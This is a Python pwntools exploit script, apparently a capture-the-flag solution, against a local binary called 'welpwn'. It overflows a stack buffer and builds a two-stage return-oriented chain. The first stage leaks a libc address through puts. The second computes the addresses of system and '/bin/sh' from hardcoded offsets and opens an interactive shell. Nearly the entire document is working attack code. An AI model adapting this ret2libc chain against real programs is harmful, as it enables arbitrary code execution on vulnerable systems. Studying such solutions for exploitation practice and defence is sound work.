#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
from struct import pack, unpack

with open('payload', 'w') as f:
	f.write('')

def send(conn, line):
	with open('payload', 'a') as f:
		line += '\x0a'
		f.write(line)
	conn.send(line)


pops = 0x000000000040089C
main = 0x00000000004007CD 
printf_got = 0x0000000000601028
dec_n_ret = 0x4007ca   
pop_rdi = 0x4008a3 #: pop rdi; ret
printf_plt = 0x4005c0  # printf

write_plt = 0x00000000004005b0 #<write@plt>:
puts_plt = 0x00000000004005a0# <puts@plt>:
libc_plt = 0x0000000000601040

# offset to system From 0x7ffff7a52a50 to 0x7ffff7a72490: 129600 bytes, 32400 dwords
system_offset = 129600

def my_hex(h):
	h = hex(h)[2:]
	if len(h) == 1:
		h = '0' + h
	return h

# this is the padding required to get to eip
# and use 'RAINY' which increments by 1
padding1 = 'A'*16 + 'B'*8
padding2 = 'C'*16 + 'D'*8
conn = process('./welpwn')

welcome = conn.recv()
print welcome


# leak libc_start with puts
payload = padding1 
payload += p64(pops) 
payload += p64(pop_rdi) 
payload += p64(libc_plt) 
payload += p64(puts_plt)
payload += p64(main) 

send(conn, payload)
conn.recvuntil('AAAAAAAAAAAAAAAABBBBBBBB')
response = conn.recv()

libc_start = u64( ( response[-7:-1] + "\0"*8)[:8] )
#From 0x7ffff7a52a50 to 0x7ffff7b949a0: 1318736 bytes, 329684 dwords

offset_to_bin = 1318736

# call system with /bin/shf
payload = padding1 
payload += p64(pops) 
payload += p64(pop_rdi) 
payload += p64(libc_start + offset_to_bin )
payload += p64(libc_start + system_offset - 0) 
send(conn, payload)
conn.interactive()